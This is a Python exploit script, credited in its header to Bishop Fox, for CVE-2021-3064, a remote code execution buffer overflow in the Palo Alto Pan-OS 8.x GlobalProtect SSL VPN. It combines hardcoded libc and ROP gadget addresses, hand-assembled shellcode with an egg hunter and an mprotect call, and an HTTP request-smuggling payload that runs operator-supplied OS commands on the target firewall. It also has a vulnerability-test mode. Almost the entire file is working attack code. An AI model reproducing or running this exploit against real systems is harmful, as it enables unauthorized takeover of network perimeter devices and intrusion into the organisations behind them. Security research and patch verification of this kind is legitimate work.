#!/usr/bin/env python3

#
# Bishop Fox Cosmos Team
# Pan-OS 8.x_vm buffer overflow exploit 
#
# 4/25/2022
#
# Run: ./CVE-2021-3064.py
#

import struct
import ssl
import socket
import sys
import time
import base64

systemAddr =   0x7ffff70176b0    # 8.1.1 - 8.1.16
ROPGadget  =   0x7ffff704a72d    # 8.1.1 - 8.1.16
mprotectAddr = 0x7ffff70a8fa0    # 8.1.1 - 8.1.16
#systemAddr = 0x7ffff70170b0   # 8.1.0
#ROPGadget  = 0x7ffff7032ff5   # 8.1.0

# NULL-free shellcode for strcpy() overflow
exploitPayload = (

    # 2nd stage of shellcode
    "\x48\xc7\xc0\x8f\x90\x90\x90"              # mov rax, 0x9090908f           # don't pollute the heap with fake egg
    "\xfe\xc0"                                  # inc rl                        # rax = 0x58584148 = "HAXX" = egg
    "\x31\xc9\x48\x83\xe9\x01"                  # mov rcx, 0xffffffffffffffff   # count forever
    "\x48\xc7\xc7\x08\x01\x01\x01"              # mov rdi, 0x01010108           # start address for egg hunt on heap
    "\xf2\xaf"                                  # repne scasd eax, dword [rdi]  # find "\x90\x90\x90\x90"
    "\x57"                                      # push rdi                      # save a copy of heap address for later

    # mprotect param 1: page-aligned address to modify
    # mprotect(2) requires a page-aligned address. Pages are typically 4k in size.
    # A simple hack for this is to shift right by 12 bits, then shift left by 12 bits.
    # This takes an address like 0x10c9ABC and makes it 0x10c9000.
    "\x48\xc1\xef\x0c"                          # shr rdi, 12                   # shift right then left by 12 bits...
    "\x48\xc1\xe7\x0c"                          # shl rdi, 12                   # ...to page-align the heap address.
    
    # mprotect param 2: number of bytes to change. 64k in this case.
    "\x48\xc1\xe9\x30"                          # shr rcx, 48                   # leave 0x000000000000ffff in rcx
    "\x48\x89\xce"                              # mov rsi, rcx
    
    # mprotect param 3: RWX page protection flags
    "\x28\xf6"                                  # sub dh, dh
    "\xb2\x07"                                  # mov dl, 7                     # RWX

    # call mprotect(heap_addr, 0xffff, PAGE_READ | PAGE_WRITE | PAGE_EXECUTE)
    "\xff\xd3"                                   # call rbx / mprotect
    
    # restore heap/shellcode address into rbx, then jump to it
    "\x5b"                                       # pop rbx
    "\xff\xe3"                                   # jmp rbx
    
    # 1 byte to spare
    "\x90"
    
    # 1st stage (entry point) of shellcode starts here
    "\x48\xbb__MPROTECT__\xff\xff"              # mov rbx, addr_of_mprotect with ffff in msb
    "\x48\xc1\xe3\x10"                          # shl rbx, 16
    "\x48\xc1\xeb\x10"                          # shr rbx, 16   # rbx=0x00007ffff70176b0 (mprotect @ libc-2.12.so)
    "\x90\x90"                                  # nop padding
    "\xeb\xb8"                                  # jmp -70       # jump to 2nd stage of shellcode

    # Last 6 characters (7 with the strcpy()'d NULL) replace RIP on the stack
    "__ROP_GADGET__"                            # RET overwrite. 0x007ffff704a72d @ libc-2.12.so = "jmp rsi" 

).replace("__MPROTECT__",   struct.pack('<Q', mprotectAddr)[0:6].decode('raw_unicode_escape'))\
 .replace("__ROP_GADGET__", struct.pack('<Q', ROPGadget)[0:6].decode('raw_unicode_escape'))

saveStackPayload = "\x48\x89\xe3"               # mov rbx, rsp                  # save the stack pointer in rbx

commandExecPayload = (
    
    "\x66\xb8\xff\xff"                          # xor rax, rax
    "\x48\x31\xc0"                              # mov ax, 0xffff                # give 64k of stack space to system()
    "\x48\x29\xc4"                              # sub rsp, rax

    "\x48\xba__SYSTEM__\xff\xff"                # mov rdx, system@GOT | 0xffff000000000000
    "\x48\xc1\xe2\x10"                          # shl rdx, 16
    "\x48\xc1\xea\x10"                          # shr rdx, 16   # rdx=0x00007ffff70176b0 (system @ libc-2.12.so)

    "\x48\xc7\xc0\x47\x41\x58\x58"              # mov rax, 0x58584147           # don't pollute the heap with false egg
    "\x48\xff\xc0"                              # inc rax                       # rax = 0x58584148 = "HAXX" = egg
    "\x31\xc9\x48\x83\xe9\x01"                  # mov rcx, 0xffffffffffffffff   # count forever
    "\x48\xc7\xc7\x08\x01\x01\x01"              # mov rdi, 0x01010108           # start address for egg hunt on heap
    "\xf2\xaf"                                  # repne scasd eax, dword [rdi]  # find "HAXX"

    "\xff\xd2"                                  # call rdx                      # system("HAXX; OS commands;")    
).replace("__SYSTEM__",     struct.pack('<Q', systemAddr)[0:6].decode('raw_unicode_escape'))

stackRepairPayload = (
    "\x66\x81\xc3\xa0\x02"                      # add bx, 0x2a0
    "\x48\x89\xdc"                              # mov rsp, rbx                  # restore rsp

    "\x48\x89\xe5"                              # mov rbp, rsp
    "\x48\x31\xc0"                              # xor rax, rax
    "\xb0\x50"                                  # mov al, 0x50
    "\x48\x01\xc5"                              # add rbp, rax                  # add the magic offset to rbp

    # rsp and rbp are now set to the values normally associated with sslvpnHandler_run()'s epilogue.
    # The original sslvpnHandler_run() code calls leave/ret, so we do too.
    "\xc9"                                      # leave
    "\xc3"                                      # ret

    # Our work here is done. Appweb3 will now close the HTTP session with the exploit.
)

##
## Any shellcode between "saveStackPayload" and "stackRepairPayload" MUST preserve the rbx register.
##
stage2Shellcode = saveStackPayload + commandExecPayload + stackRepairPayload

# The good stuff
payload = (
    "HEAD /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.1\r\n"
    # for 8.1.17 "HEAD /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345&ts=AAAAAAAAAAAAAAAAAAAAAA&token=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE= HTTP/1.1\r\n"
    "Transfer-Encoding\r\n"
    "Connection: keep-alive\r\n"
    "Content-length:LLLLL\r\n"
    "\r\n"
)
smuggledRequest = (
    "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.0\r\n"
    # for 8.1.17 "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345&ts=AAAAAAAAAAAAAAAAAAAAAA&token=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE= HTTP/1.0\r\n"
    "X-Real-IP: XXXXX\r\n"
    "X-Real-PORT: 31337\r\n"
    "\r\n"
    "\x90\x90\x90\x90\x90\x90\x90\x90YYYYY\xcc\xcc\xcc\xcc\xcc\xcc\xccHAXX HAXX HAXX HAXX HAXX HAXX HAXX HAXX;ZZZZZ;\r\n"
    "\r\n"
)

# Functions
def getConnectedSocket(host, port):
    # Setup SSL
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sslSock = ctx.wrap_socket(tcpSock, server_hostname=host)

    # Try SSL. Fall back to clear text if it fails.
    sock = sslSock
    try:
        sock.connect((host, port))
    except ssl.SSLError:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        try:
            sock.connect((host, port))
        except:
            print("ERROR: couldn't connect to %s:%d" % (host, port))
            exit(1)

    return sock

# Helper to send bytes to a socket and read a response
def send_recieve(sock, data):
    try:
        sock.sendall(data)
        return sock.recv(4096).decode().split('\r\n')
    except Exception as e:
        print("send_receive exception: ", e)
        return None

# Return True or False
def is_vulnerable(host, port):
    # connect to remote server
    sock = getConnectedSocket(host, port)

    # send request designed to elicit "Invalid input"
    payload = "GET /clientcert-info.sslvpn? HTTP/1.1\r\n\r\n".encode('raw_unicode_escape')
    r = send_recieve(sock, payload)

    if (r == None) or (not "HTTP/1.1 552 Custom error" in r):
        reason = "Not vulnerable: doesn't look like Palo Alto Global Protect"
        return (False, reason)

    if not "<p>Invalid input: /clientcert-info.sslvpn</p>" in r:
        reason = "Not vulnerable: didn't receive expected response ('Invalid input') from Global Protect"
        return (False, reason)

    # send request that will pass for <= 8.1.16, but error with "Invalid input" for >= 8.1.17
    payload = "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.1\r\n\r\n".encode('raw_unicode_escape')
    r = send_recieve(sock, payload)

    if (r == None) or (not "HTTP/1.1 552 Custom error" in r):
        reason = "Not vulnerable: didn't receive expected response ('HTTP/1.1 552 Custom error')"
        return (False, reason)

    if "<p>Invalid input: /clientcert-info.sslvpn</p>" in r:
        reason = "Not vulnerable: found Pan-OS version >= 8.1.17 (see code comments re: 8.1.17)"
        return (False, reason)
        # for 8.1.17 support: return (True, reason)
    
    if "Transfer-Encoding: chunked" in r:
        if "Connection: keep-alive" in r:
            if "Content-Type: text/html" in r:
                return (True, "Vulnerable!")

    return (False, "Not vulnerable? Unknown. Response: %s" % str(r))

# Either exit() if unsuccessful, or return if (probably) successful.
def do_exploit():
    global payload, host, port

    print("[+] do_exploit(%s:%d)" % (host, port))
    try:
        sock = getConnectedSocket(host, port)   
        sock.send(payload.encode('raw_unicode_escape'))
    
        # Read firewall response
        #print("[+] Read response")
        r = sock.recv(512).decode().split('\r\n')
        response = "\n".join(r)
        sock.close()
    except Exception as e:
        print("\nException: ", e)

    # If we get a response matching the following parameters, then the exploit
    # was _probably_ successful. Or it crashed the remote process. Figure it out ;)
    if "HTTP/1.1 400 Bad Request" in response and "Content-Length: 176" in response:
        print("[+] Received the expected response! Exploit appears successful.")
    else:
        print("[!] Did NOT receive the expected response.\n\n%s" % response)
        exit(1)


# Handle command-line
if len(sys.argv) != 3:
    print("%s host[:port] -t | 'OS commands to execute'" % sys.argv[0])
    print("\nSpecify either '-t' or commands to execute.")
    print("Using -t will test for vulnerability without attempting the exploit.")
    exit(1)

host = sys.argv[1]
if ':' in host:
    (host, port) = host.split(':')
    port = int(port)
else:
    host = sys.argv[1]
    port = 20077

attemptExploit = True
if sys.argv[2] == '-t':
    attemptExploit = False
else:
    rceCommands = sys.argv[2]


# Test vuln before trying the exploit
print("[+] Testing to see if %s is vulnerable..." % host)
(status, reason) = is_vulnerable(host, port)
if status == False:
    print("[!] %s" % reason)
    exit(2)

if attemptExploit == False:
    print("[+] %s" % reason)
    exit(0)


# Populate our payload buffer
smuggledRequest = smuggledRequest.replace("XXXXX", exploitPayload)
smuggledRequest = smuggledRequest.replace("YYYYY", stage2Shellcode)
smuggledRequest = smuggledRequest.replace("ZZZZZ", rceCommands)
payload = payload.replace("LLLLL", str(len(smuggledRequest)))
payload = payload + smuggledRequest

# Unleash the beast
print("[+] %s appears to be vulnerable. Trying the exploit!" % host)
do_exploit()
print("[+] All done. So long, and thanks for all the fish!")

# EOF